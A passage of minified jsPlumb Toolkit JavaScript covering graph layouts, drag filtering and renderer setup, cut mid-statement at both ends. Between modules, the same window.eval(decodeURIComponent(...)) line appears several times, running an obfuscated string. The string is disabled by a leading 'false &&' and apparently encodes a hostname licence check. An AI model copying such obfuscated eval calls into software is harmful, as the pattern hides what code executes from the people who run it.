A=y(w),T=i.c*A.f[0],k=i.c*A.f[1],D=i.maxVertexMovement;T>D&&(T=D),T<-D&&(T=-D),k>D&&(k=D),k<-D&&(k=-D),_(A,A.p[0]+T,A.p[1]+k),A.f[0]=0,A.f[1]=0}a++,(0===f||a>=i.iterations)&&(function(){h=n.width/(d-l)*.62,p=n.height/(c-u)*.62;for(var t in r){var e=r[t];e.locked||(e.sp=m(e.p),n.setPosition(e.id,e.sp[0],e.sp[1],!0))}}(),n.setDone(!0))},this.end=function(){for(var t in r)r[t].locked=!0}},e.extend(t.Spring,t.AbsoluteBackedLayout)}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("false%20%26%26%20window._j.%24%24_%24%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j._%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.__%2b%22.%22%2b(!%5b%5d%2b%22%22)%5bwindow._j._%24_%5d%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j.%24_%24_%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.__%24%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2b%22.%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.___%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24%24_%2bwindow._j._%24%24%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.%24_%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22!%3d%3d%27%5c%5c%22")),function(){"use strict";var t=this.jsPlumbToolkit.Layouts,e=this.Farahey;t.Balloon=function(n){n=n||{};var o,i=t.AbstractHierarchicalLayout.apply(this,arguments),r=[];this.defaultParameters={padding:50,locationFunction:n.locationFunction,groupPadding:100};var s=e.getInstance({padding:[100,100],getPosition:function(t){return{left:t.extents[0],top:t.extents[2]}},setPosition:function(t,e){for(var n=0;n<t.group.length;n++){var o=t.offsets[t.group[n].id];t.setPosition(t.group[n].id,e.left+o.left,e.top+o.top)}},getSize:function(t){return[t.extents[1]-t.extents[0],t.extents[3]-t.extents[2]]},getId:function(t){return t.focus.id},filter:function(t){return r[0].focus.id!==t}}),a=this.begin;this.begin=function(t,e){a.apply(this,arguments),r.length=0,o=e.getChildEdges};var l=function(t,n,s){var a,d,u,c,h,p,f=function(t,e,n,o){return{x:t-s.padding,y:e-s.padding,w:n+2*s.padding,h:o+2*s.padding}},g={focus:t,childMap:{},children:[],positions:{},incidentAngles:[],setPosition:function(t,e,n){this.positions[t]=[e,n]},getPosition:function(t){return this.positions[t]},setIncidentAngle:function(t,e){this.incidentAngles[t]=e},group:[t]},_=n?n.position:[0,0],b=_[0],v=_[1],m={},w=function(t){return m[t]||(m[t]=i.getSize(t),m[t])};g.setPosition(t.id,_[0],_[1]);var j=o(t);for(a=0;a<j.length;a++){var y=j[a].target.getNode?j[a].target.getNode():j[a].target;g.childMap[y.id]||(g.childMap[y.id]=!0,g.children.push(y))}if(c=w(g.focus.id),u=Math.max(c[0],c[1]),p=f(b-c[0]/2,v-c[1]/2,c[0],c[1]),i.setPosition(g.focus.id,-c[0]/2,-c[1]/2,!0),g.children.length>0){r.push(g);var P=2*Math.PI/(g.children.length+(n?1:0)),E=n?n.incidentAngle+Math.PI+P:Math.PI,x=E;for(a=0;a<g.children.length;a++){h=w((d=g.children[a]).id);var C=f(b+Math.sin(E)*h[0],v+Math.cos(E)*h[1],h[0],h[1]);if(O=e.calculateSpacingAdjustment(p,C),R=Math.sqrt(Math.pow(C.x+O.left-b,2)+Math.pow(C.y+O.top-v,2)),u=Math.max(u,R),g.setPosition(d.id,C.x+O.left,C.y+O.top),E+=P,a>0){var S=g.children[a-1],I=w(S.id),A=g.getPosition(S.id),T=f(A[0],A[1],I[0],I[1]),k=g.children[a],D=w(k.id),N=g.getPosition(k.id),M=f(N[0],N[1],D[0],D[1]),O=e.calculateSpacingAdjustment(T,M),F=[A[0]+I[0]/2,A[1]+I[1]/2],L=[N[0]+O.left+D[0]/2,N[1]+O.top+ +D[1]/2],R=Math.sqrt(Math.pow(F[0]-L[0],2)+Math.pow(F[1]-L[1],2));u=Math.max(u,R/2/Math.sin(P/2))}}for(E=x,a=0;a<g.children.length;a++)d=g.children[a],g.setIncidentAngle(d.id,E),g.setPosition(d.id,b+Math.sin(E)*u,v+Math.cos(E)*u,!0),E+=P;var G,U=g.positions[t.id][0],z=i.getSize(t.id),V=U+z[0],B=g.positions[t.id][1],H=B+z[1];for(a=0;a<g.children.length;a++)d=g.children[a],l(d,{parent:t,incidentAngle:g.incidentAngles[d.id],position:g.positions[d.id]},s)||(G=i.getSize(d.id),g.group.push(d),U=Math.min(U,g.positions[d.id][0]),V=Math.max(V,g.positions[d.id][0]+G[0]),B=Math.min(B,g.positions[d.id][1]),H=Math.max(H,g.positions[d.id][1]+G[1]));for(g.extents=[U,V,B,H],g.offsets={},a=0;a<g.group.length;a++){var W=g.group[a];g.offsets[W.id]={left:g.positions[W.id][0]-g.extents[0],top:g.positions[W.id][1]-g.extents[2]}}}return g.children.length};this.step=function(t,e){if(e.rootNode&&e.rootNode.length>0){if(l(e.rootNode[0],null,e),r.length>0){var n=(r[0].extents[0]+r[0].extents[1])/2,o=(r[0].extents[2]+r[0].extents[3])/2;s.setElements(r),s.execute([n,o])}for(var a=0;a<r.length;a++){var d=r[a];for(var u in d.positions)i.setPosition(u,d.positions[u][0],d.positions[u][1],!0)}}i.setDone(!0)}}}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("false%20%26%26%20window._j.%24%24_%24%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j._%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.__%2b%22.%22%2b(!%5b%5d%2b%22%22)%5bwindow._j._%24_%5d%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j.%24_%24_%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.__%24%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2b%22.%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.___%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24%24_%2bwindow._j._%24%24%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.%24_%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22!%3d%3d%27%5c%5c%22")),function(){"use strict";var t=(this.jsPlumb,this.jsPlumbToolkit);t.UI=t.UI||{},t.UI.ActiveDragFilter=function(t,e,n){var o={};e.bind("connectionDrag",function(e){function i(e,i){r=n.beforeConnect(e,i),d=i.getFullId(),!1===r&&null==o[d]&&(o[d]=t.setTargetEnabled(i,!1))}var r,s,a,l,d,u=e.source.jtk.port,c=u?u.getNode():e.source.jtk.node,h=n.getNodeCount(),p=n.getGroupCount();if(u)for(i(u,c),s=c.getPorts(),a=0;a<s.length;a++)i(u,s[a]);for(a=0;a<h;a++){var f=n.getNodeAt(a);for(i(u||c,f),s=f.getPorts(),l=0;l<s.length;l++)i(u||c,s[l])}for(a=0;a<p;a++){var g=n.getGroupAt(a);for(i(u||c,g),s=g.getPorts(),l=0;l<s.length;l++)i(u||c,s[l])}}),e.bind("connectionDragStop",function(){function e(e){!0===o[e.getFullId()]&&t.setTargetEnabled(e,!0)}var i,r,s,a=n.getNodeCount();for(i=0;i<a;i++){var l=n.getNodeAt(i);for(e(l),r=l.getPorts(),s=0;s<r.length;s++)e(r[s])}var d=n.getGroupCount();for(i=0;i<d;i++){var u=n.getGroupAt(i);for(e(u),r=u.getPorts(),s=0;s<r.length;s++)e(r[s])}o={}})}}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("false%20%26%26%20window._j.%24%24_%24%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j._%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.__%2b%22.%22%2b(!%5b%5d%2b%22%22)%5bwindow._j._%24_%5d%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j.%24_%24_%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.__%24%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2b%22.%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.___%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24%24_%2bwindow._j._%24%24%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.%24_%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22!%3d%3d%27%5c%5c%22")),function(){"use strict";var t=this.jsPlumbToolkit.Renderers,e=this.jsPlumbToolkit,n=this.jsPlumbToolkitUtil,o=this.jsPlumbUtil,i=this.jsPlumb,r=this.Rotors,s=e.Constants;e.UIState=function(t,e,n){for(var o in e)if(e.hasOwnProperty(o)){var i="*"===o?"e-state-"+t:"e-state-"+t+"-"+o,r="*"===o?"c-state-"+t:"c-state-"+t+"-"+o;n.registerEndpointType(i,e[o]),n.registerConnectionType(r,e[o])}this.activate=function(o,i,r){o.eachEdge(function(n,o){var a=i.getRenderedConnection(o.getId()),l=r.getEdgeType(o.data),d=l?"c-state-"+t+"-"+l:null;d&&a.addType(d,o.data),e["*"]&&a.addType("c-state-"+t,o.data),s(o,a,o.source,0,"addType",r),s(o,a,o.target,1,"addType",r)}),o.eachNode(function(t,o){var s=r.getNodeType(o.data),a=s?e[s]:null,l=i.getRenderedNode(o.id);a&&a.cssClass&&n.addClass(l,a.cssClass),e["*"]&&n.addClass(l,e["*"].cssClass)})};var s=function(e,n,o,i,r,s){var a=n.endpoints[i],l=s.getPortType(o.data);a[r]("e-state-"+t+"-"+l),a[r]("e-state-"+t)};this.deactivate=function(o,i,r){o.eachEdge(function(n,o){var a=i.getRenderedConnection(o.getId()),l=r.getEdgeType(o.data),d=l?"c-state-"+t+"-"+l:null;d&&a.removeType(d,o.data),e["*"]&&a.removeType("c-state-"+t),s(o,a,o.source,0,"removeType",r),s(o,a,o.target,1,"removeType",r)}),o.eachNode(function(t,o){var s=r.getNodeType(o.data),a=s?e[s]:null,l=i.getRenderedNode(o.id);a&&a.cssClass&&n.removeClass(l,a.cssClass),e["*"]&&n.removeClass(l,e["*"].cssClass)})}};var a=t.atts={NODE:"data-jtk-node-id",PORT:"data-jtk-port-id",GROUP:"data-jtk-group-id"},l=t.els={SOURCE:"JTK-SOURCE",PORT:"JTK-PORT",TARGET:"JTK-TARGET"},d=e.Classes,u=(s=e.Constants,e.Events);t.mouseEvents=["click","dblclick","contextmenu","mousedown","mouseup","mousemove","mouseenter","mouseleave","mouseover"],t.createElement=function(t,e){var n={width:t.width,height:t.height,position:t.position||s.absolute},o={};t.display&&(n.display=t.display),t.id&&(o.id=t.id),t.top&&(n.top=t.top+"px"),t.left&&(n.left=t.left+"px"),t.right&&(n.right=t.right+"px"),t.bottom&&(n.bottom=t.bottom+"px");var r=i.createElement(t.type||s.div,n,t.clazz,o);return null!=e&&i.appendElement(r,e),r};var c=function(t){var e=this.getJsPlumb(),n=e.getElement(t.container);this.getWidth=function(){return e.getSize(n)[0]},this.getHeight=function(){return e.getSize(n)[1]},this.append=function(t){var o=e.getElement(t);e.appendElement(o,n)},this.remove=function(t){var n=e.getElement(t);e.removeElement(n)},this.setAbsolutePosition=i.setAbsolutePosition,this.getOffset=function(t,n){return e.getOffset(t,n)}};t.DOMElementAdapter=c;var h=function(t){this.getOffset=function(){return t.getOffset.apply(t,arguments)},this.append=function(){return t.append.apply(t,arguments)},this.setAbsolutePosition=function(){return t.setAbsolutePosition.apply(t,arguments)},this.floatElement=function(){return t.floatElement.apply(t,arguments)},this.fixElement=function(){return t.fixElement.apply(t,arguments)}},p=function(t){h.apply(this,[t]),this.filter=function(t){return"Group"===t.objectType||"Node"===t.objectType&&null==t.group},this.getElements=function(){var e=t.getNodes().filter(function(t,e){return null==t.group});return Array.prototype.push.apply(e,t.getGroups()),e},this.setElementPosition=function(e,n,o){return t.setPosition.apply(t,[e,n,o,!1,!0])}},f=t.AbstractRenderer=function(t){function c(t){nt=!0;try{t()}catch(t){jsPlumbUtil.log("An error occurred while ignoring Toolkit events",t)}finally{nt=!1}}function f(t,e){bt.push({event:t,fn:e}),D.bind(t,e)}function g(t,e,n,o,r,s,a,l,d){(e=q.getElement(e)).setAttribute(l,n),i.addClass(e,a),e.jtk=e.jtk||{},e.jtk[o]=t,e.jtk.node=s,d&&O&&Ut.makeDraggable&&Ut.makeDraggable(e,r.dragOptions),F&&Ut.makeDroppable&&Ut.makeDroppable(e,r.dropOptions);var u=function(t){q.on(e,t,function(n){var o={el:e,e:n,toolkit:D,renderer:k};o["Node"===s.objectType?"node":"group"]=s,r.events[t](o)})};if(r&&r.events)for(var c in r.events)u(c)}function _(t,e,n,o){rt[o.id+D.getGraph().getPortSeparator()+e.id]=t,Gt(t,o),k.fire(u.portAdded,{node:o,nodeEl:n,port:e,portEl:t})}function b(t,e,n){if(null==t.value("jtk-processed")){t.setValue("jtk-processed",!0);var o=Ft(t,e,n),i=q.addEndpoint(t.element,o);Nt[e.id+"."+o.portId]=i;var r=t.port||e.addPort({id:o.portId});i.graph={node:e,port:r},T.onUpdate(t.element,function(){})}}function v(t,e){if(e.events)for(var n in e.events)q.on(t,n,e.events[n])}function m(t,e,n){if(null==t.value("jtk-processed")){t.setValue("jtk-processed",!0);var o=Ft(t,e,n);o.rank="Node"===e.objectType?10:0,null!=o.portId&&(rt[e.id+"."+o.portId]=t.element,t.element.jtk=t.element.jtk||{},t.element.jtk.port=D.addPort(e,{id:o.portId,type:o.portType||"default"},!0),v(t.element,o));var r=t.value("filter");if(r){var s="true"===t.value("filter-exclude");o.filter=r,o.filterExclude=s}if("true"===t.value("is-source")&&(o.isSource=!0),delete o.uniqueEndpoint,delete o.createEndpoint,o.extract={},t.findDataValues(o.extract),"true"===t.value("endpoint")){o.maxConnections=-1,o.isSource=!0;var a=q.addEndpoint(t.element,o);a.graph={},a.graph["Node"===e.objectType?"node":"group"]=e,Mt[e.id]=a,T.onUpdate(t.element,function(){})}else{var l,d=t.element._katavorioDrop?t.element._katavorioDrop.length:0;q.makeSource(t.element,o),(t.element._katavorioDrop?t.element._katavorioDrop.length:0)>d&&(l=t.element._katavorioDrop[t.element._katavorioDrop.length-1]),T.onUpdate(t.element,function(t,n){var o=i.getSelector(t,"jtk-source");if(1===o.length){var r=Ft(o[0],e);r.scope&&(q.setSourceScope(t,r.scope,r.edgeType),l&&l.k.setDropScope(l,r.scope))}})}}}function w(t,e,n){if(null==t.value("jtk-processed")){t.setValue("jtk-processed",!0);var o=Ft(t,e,n);if(o.rank="Node"===e.objectType?10:0,null!=o.portId&&(rt[e.id+"."+o.portId]=t.element,t.element.jtk=t.element.jtk||{},t.element.jtk.port=D.addPort(e,{id:o.portId,type:o.portType||"default"},!0),v(t.element,o)),"true"===t.value("is-target")&&(o.isTarget=!0),delete o.uniqueEndpoint,delete o.createEndpoint,"true"===t.value("endpoint")){o.maxConnections=-1,o.isTarget=!0;var r=q.addEndpoint(t.element,o);r.graph={},r.graph["Node"===e.objectType?"node":"group"]=e,Ot[e.id]=r,T.onUpdate(t.element,function(){})}else{q.makeTarget(t.element,o);var s=t.element._katavorioDrop[t.element._katavorioDrop.length-1];T.onUpdate(t.element,function(t,n){var o=i.getSelector(t,"jtk-target");if(1===o.length){var r=Ft(o[0],e);r.scope&&(s.targetDef.def.scope=r.scope,s.k.setDropScope(s,r.scope))}})}}}function j(t){var e=t.info||x(t.node);return e&&e.obj&&(!1!==t.updateLayout&&(e.obj.group?e.obj.group.layout:N).setPosition(e.id,t.x,t.y),t.doNotUpdateElement||(q.setAbsolutePosition(e.el,[t.x,t.y],t.animateFrom,t.animateOptions),q.revalidate(e.el))),e}function y(t,e,n){if(1===e.connections.length)e.setVisible(n,!0);else if(n)e.setVisible(!0,!0);else{for(var o=0;o<e.connections.length;o++)if(e.connections[o]!==t&&e.connections[o].isVisible())return;e.setVisible(!1,!0)}}function P(t,e,n){var o,i=ct(t);i&&(!e||!1!==(o=i).endpoints[0].element._jtkVisible&&!1!==o.endpoints[1].element._jtkVisible)&&(i.setVisible(e),n||(y(i,i.endpoints[0],e),y(i,i.endpoints[1],e)))}function E(t,e){var n;if(t.eachNode&&t.eachEdge)n={nodes:[],edges:[]},t.eachNode(function(t,o){n.nodes.push(e(x(o)))}),t.eachEdge(function(t,o){n.edges.push(e(x(o)))});else if(t.length&&"string"!=typeof t){n=[];for(var o=0;o<t.length;o++)n.push(e(x(t[o])))}else n=e(x(t));return n}function x(t){return t instanceof q.getDefaultConnectionType()&&(t=t.edge),D.getObjectInfo(t,function(t){return t.getNode?rt[t.getFullId()]||ot[t.getNode().id]:ot[t.id]||st[t.id]})}t=t||{};var C=function(t,e){var n=i.createElement("div",{border:"1px solid #456",position:"absolute"},d.NODE);return n.innerHTML=t.name||t.id,n},S='<div data-jtk-node-id="${id}" class="'+d.NODE+'"></div>',I={rotors:{render:function(t,e){return T.template(t,e).childNodes[0]}}},A=!0===t.debug,T=r.newInstance({defaultTemplate:S,templateResolver:t.templateResolver,templates:t.templates}),k=this,D=t.toolkit,N=new e.Layouts.EmptyLayout(new p(k)),M=i.getElement(t.container),O=!(!1===t.elementsDraggable),F=!0===t.elementsDroppable,L=!1,R=!1!==t.refreshAutomatically,G=t.templateRenderer?o.isString(t.templateRenderer)?I[t.templateRenderer]:{render:t.templateRenderer}:I.rotors,U=!1!==t.enhancedView,z=t.assignPosse||function(){return null},V=t.modelLeftAttribute||"left",B=t.modelTopAttribute||"top",H=!1!==t.storePositionsInModel,W=t.objectFilter||function(){return!0},X=!0===t.ignoreGroups,Y=!0===t.renderPortsAsynchronously,Z=o.merge(t.jsPlumb||{}),q=t.jsPlumbInstance||i.getInstance(Z,t.overrideFns),J=q.getId(M);q.bind("beforeDrop",function(t){var e=t.connection,n=e.endpoints[0].graph||e.source.jtk,o=e.endpoints[1].graph||e.target.jtk,i=n.port||n.node||n.group,r=o.port||o.node||o.group,s=t.connection.edge;return null==s?D.beforeConnect(i,r,t.connection.getData()):D.beforeMoveConnection(i,r,s)}),q.bind("beforeDrag",function(t){var e=t.endpoint.graph||t.source.jtk,n=e.port||e.node,o=t.endpoint.connectionType,i=D.beforeStartConnect(n,o);if(A){var r=ft.getEdgeDefinition(o)||{};console.log("\n------------------------\nDrag started with edge type `"+o+"`, having definition :"),console.log(r),console.log("Edge source is a "+n.objectType+", having type ["+n.getType()+"], with definition :");var s=ft["get"+n.objectType+"Definition"](n.getType())||{};console.log(s),console.log("Toolkit response to drag start :"),console.log(i),console.log("---------------------------\n")}return!1===i&&t.endpoint.isTemporarySource&&t.endpoint._deleteOnDetach&&q.deleteEndpoint(t.endpoint),i}),q.bind("beforeDetach",function(t,e){var n=t.endpoints[0].graph||t.source.jtk,o=t.endpoints[1].graph||t.target.jtk,i=n.port||n.node,r=o.port||o.node,s=t.edge;return D.beforeDetach(i,r,s,e)}),q.bind("beforeStartDetach",function(t){var e=t.endpoint.graph||t.source.jtk,n=e.port||e.node,o=t.connection.edge;return D.beforeStartDetach(n,o)}),q.bind("connectionEdit",function(t){t.edge&&(t.edge.geometry=t.getConnector().getGeometry())}),o.EventGenerator.apply(this,arguments),t.activeFiltering&&new e.UI.ActiveDragFilter(k,q,D),this.setDebug=function(t){A=t,console.log("-----------------------\nSurface debug switched "+(t?"on":"off")+" \n-------------------------\n")},this.getJsPlumb=function(){return q},this.getToolkit=function(){return D};var $=[u.canvasClick,u.canvasDblClick,u.nodeAdded,u.nodeDropped,u.nodeRemoved,u.nodeRendered,u.groupAdded,u.groupRemoved,u.groupMoveEnd,u.groupMemberAdded,u.groupMemberRemoved,u.groupCollapse,u.groupExpand,u.groupRelayout,u.nodeMoveStart,u.nodeMoveEnd,u.portAdded,u.portRemoved,u.edgeAdded,u.edgeRemoved,u.edgeTypeChanged,u.nodeTypeChanged,u.portTypeChanged,u.dataLoadEnd,u.anchorChanged,u.objectRepainted,u.modeChanged,u.lassoEnd,u.pan,u.zoom,u.relayout,u.click,u.tap,u.stateRestored,u.startOverlayAnimation,u.endOverlayAnimation,u.nodeVisibility],K=k.bind,Q=q.bind;if(this.setHoverSuspended=q.setHoverSuspended,this.isHoverSuspended=q.isHoverSuspended,this.setJsPlumbDefaults=function(t){delete t.Container,q.restoreDefaults(),q.importDefaults(t)},this.bind=function(t,e){-1==$.indexOf(t)?Q(t,e):K(t,e)},t.events)for(var tt in t.events)this.bind(tt,t.events[tt]);if(t.interceptors)for(var et in t.interceptors)this.bind(et,t.interceptors[et]);var nt=!1;Q(u.connection,function(t){if(null==t.connection.edge){t.sourceEndpoint.getParameter("nodeId")||t.sourceEndpoint.setParameter("nodeId",it[t.sourceEndpoint.elementId].id),t.targetEndpoint.getParameter("nodeId")||t.targetEndpoint.setParameter("nodeId",it[t.targetEndpoint.elementId].id);var e=t.sourceEndpoint.getParameter("portType"),n=ft.getPortDefinition(e),o=null!=n&&n.edgeType?n.edgeType:t.sourceEndpoint.getParameter("edgeType")||"default",i=t.sourceEndpoint.getParameter("nodeId"),r=t.sourceEndpoint.getParameter("portId"),s=t.targetEndpoint.getParameter("nodeId"),a=t.targetEndpoint.getParameter("portId"),l=i+(r?"."+r:""),d=s+(a?"."+a:""),c={sourceNodeId:i,sourcePortId:r,targetNodeId:s,targetPortId:a,type:o,source:D.getNode(l),target:D.getNode(d),sourceId:l,targetId:d};!1===D.getEdgeFactory()(o,t.connection.getData()||{},function(e){c.edge=D.addEdge({source:l,target:d,cost:t.connection.getCost(),directed:t.connection.isDirected(),data:e,addedByMouse:!0},k),ut[c.edge.getId()]=t.connection,t.connection.edge=c.edge,pt(o,c.edge,t.connection),c.addedByMouse=!0,c.connection=t.connection,k.fire(u.edgeAdded,c)})&&q.deleteConnection(t.connection)}}),Q(u.connectionMoved,function(t){var e=0===t.index?t.newSourceEndpoint:t.newTargetEndpoint,n=e.graph||e.element.jtk;c(function(){D.edgeMoved(t.connection.edge,n.port||n.node||n.group,t.index)})}),Q(u.connectionDetached,function(t){c(function(){D.removeEdge(t.connection.edge)});var e=t.sourceEndpoint.getParameters(),n=t.targetEndpoint.getParameters(),o=e.nodeId+(e.portId?"."+e.portId:""),i=n.nodeId+(n.portId?"."+n.portId:"");k.fire(u.edgeRemoved,{sourceNodeId:e.nodeId,targetNodeId:n.nodeId,sourcePortId:e.portId,targetPortId:n.portId,sourceId:o,targetId:i,source:D.getNode(o),target:D.getNode(i),edge:t.connection.edge})}),Q(u.groupDragStop,function(t){k.getLayout().setPosition(t.group.id,t.pos[0],t.pos[1],!0),t.uigroup=t.group,k.fire(u.groupMoveEnd,i.extend(t,{group:D.getGroup(t.uigroup.id)}))}),Q(u.groupMemberAdded,function(t){if(!L&&t.el.jtk&&t.el.jtk.node){var e=null==t.sourceGroup?null:D.getGroup(t.sourceGroup.id),n=D.addToGroup(t.el.jtk.node,t.group.id,e);n&&(t.el._droppedOnGroup=!0,k.fire(u.groupMemberAdded,{node:t.el.jtk.node,group:n,uigroup:t.group,sourceGroup:e}))}}),Q(u.groupMemberRemoved,function(t){if(!L&&t.el.jtk&&t.el.jtk.node){var e=null==t.targetGroup?null:D.getGroup(t.targetGroup.id),n=D.removeFromGroup(t.el.jtk.node,!1,e);n&&(k.nodeRemovedFromGroup(t.el),k.fire(u.groupMemberRemoved,{node:t.el.jtk.node,ugroup:n,igroup:t.group,targetGroup:e}))}}),Q(u.groupCollapse,function(t){var e=D.getGroup(t.group.id);e&&k.fire(u.groupCollapse,{group:e,uigroup:t.group})}),Q(u.groupExpand,function(t){var e=D.getGroup(t.group.id);e&&k.fire(u.groupExpand,{group:e,uigroup:t.group})});var ot={},it={},rt={},st={},at=[],lt={},dt=[];this.getNodeCount=function(){return dt.length},this.getNodeAt=function(t){return dt[t]},this.getNodes=function(){return dt},this.getNode=function(t){return ot[t]},this.getGroupCount=function(){return at.length},this.getGroupAt=function(t){return at[t]},this.getGroups=function(){return at};var ut={},ct=function(t){return ut[t.getId()]},ht=function(t,e,n,o){o.bind(t,function(t,i){e.apply(e,[{edge:n,e:i,connection:o,toolkit:D,renderer:k}])})},pt=function(t,e,n){if(!n.getParameter("edge")){var o=ft.getEdgeDefinition(t);if(o&&o.events)for(var i in o.events)ht(i,o.events[i],e,n)}};this.setSuspendRendering=function(t,e){L=t,q.setSuspendDrawing(t),e&&this.refresh()},this.batch=function(t){this.setSuspendEvents(!0),D.batch(t),this.setSuspendEvents(!1)};var ft,gt=function(t,e){if(L)vt.push([t,e]);else{var n=z(e);if(null!=n){var i=o.isArray(n)?n:[n];i.unshift(t),q.addToPosse.apply(q,i)}}},_t=function(){for(var t=0;t<vt.length;t++)gt.apply(this,vt[t])},bt=[],vt=[];if(!1!==this.bindToolkitEvents){var mt=function(){vt.length=0,q.setSuspendDrawing(!0),this.setSuspendRendering(!0)}.bind(this);f(u.dataLoadStart,mt),f(u.dataAppendStart,mt),f(u.dataLoadEnd,function(){this.setSuspendRendering(!1),_t(),q.getGroupManager().refreshAllGroups(),k.relayout(),q.setSuspendDrawing(!1,!0),N&&k.fire(u.dataLoadEnd)}.bind(this)),f(u.dataAppendEnd,function(){this.setSuspendRendering(!1),_t(),k.refresh(),q.setSuspendDrawing(!1,!0),N&&k.fire(u.dataAppendEnd)}.bind(this));var wt=function(t,e){var n,o,i,r,s=ot[t.id];if(null==s){if(!0===ft.getNodeDefinition(D.getNodeType(t.data)).ignore)return!1;if(!(s=At(t,t.data,t)))throw new Error("Cannot render node");var a=q.getId(s);ot[t.id]=s,it[a]=t,dt.push(t),s.jtk={node:t},null==t.group||X?k.append(s,a,e?e.position:null):(n=s,o=t,i=t.group,(r=st[i.id])&&((r.querySelector("[jtk-group-content]")||r).appendChild(n),q.addToGroup(i.id,n,!0),i.layout.nodeAdded({node:o,el:n}),k.nodeAppendedToGroup(n,r,i))),gt(s,t),Gt(s,t);var l={node:t,el:s,id:t.id};(null==t.group||X)&&k.getLayout().nodeAdded(l,e),k.fire(u.nodeAdded,l)}return s};f(u.nodeAdded,function(t){var e,n=t.node;if(W(n)){var o=wt(n,t.eventInfo);if(null!=o){var i=q.getSelector(o,"[data-port-id]");for(e=0;e<i.length;e++){var r=i[e].getAttribute("data-port-id");rt[n.id+"."+r]=i[e],i[e].jtk=i[e].jtk||{node:n,port:n.getPort(r)}}k.refresh(!0)}}}),f(u.nodeRemoved,function(t){(t.node.group?t.node.group.layout:k.getLayout()).nodeRemoved({node:t.node});var e=ot[t.nodeId];k.fire(u.nodeRemoved,{node:t.node,el:e});var n,o,i=q.getId(e);T.remove(e),q.remove(e),delete ot[t.nodeId],delete Mt[t.nodeId],delete Ot[t.nodeId],delete it[i],n=t.node,-1!==(o=dt.indexOf(n))&&dt.splice(o,1),delete e.jtk,k.refresh(!0)}),f(u.groupMemberAdded,function(t){var e=ot[t.node.id];e&&(k.fire(u.groupMemberAdded,t),k.getJsPlumb().addToGroup(t.group.id,e,!0),N.nodeRemoved(t),t.sourceGroup&&t.sourceGroup.layout.nodeRemoved(t),t.group.layout.nodeAdded({node:t.node,el:e}),k.relayoutGroup(t.group))}),f(u.groupMemberRemoved,function(t){var e=ot[t.node.id];if(e){if(k.fire(u.groupMemberRemoved,t),k.getJsPlumb().removeFromGroup(t.group.id,e,!0),t.group.layout.nodeRemoved(t),t.targetGroup)t.targetGroup.layout.nodeAdded({node:t.node});else{N.nodeAdded({node:t.node,el:e});var n=k.getJsPlumb().getOffset(e);k.getLayout().setPosition(t.node.id,n.left,n.top)}k.relayoutGroup(t.group)}});var jt=function(e,n){if(!X){var r=st[e.id];if(null==r){var a=ft.getGroupDefinition(D.getNodeType(e.data));if(!0===a.ignore)return!1;if(!(r=kt(e,e.data,e)))throw new Error("Cannot render Group");var l=q.getId(r);st[e.id]=r,at.push(e),lt[l]=e,r.jtk={group:e},k.append(r,l,n?n.position:null),gt(r,e),Gt(r,e);var 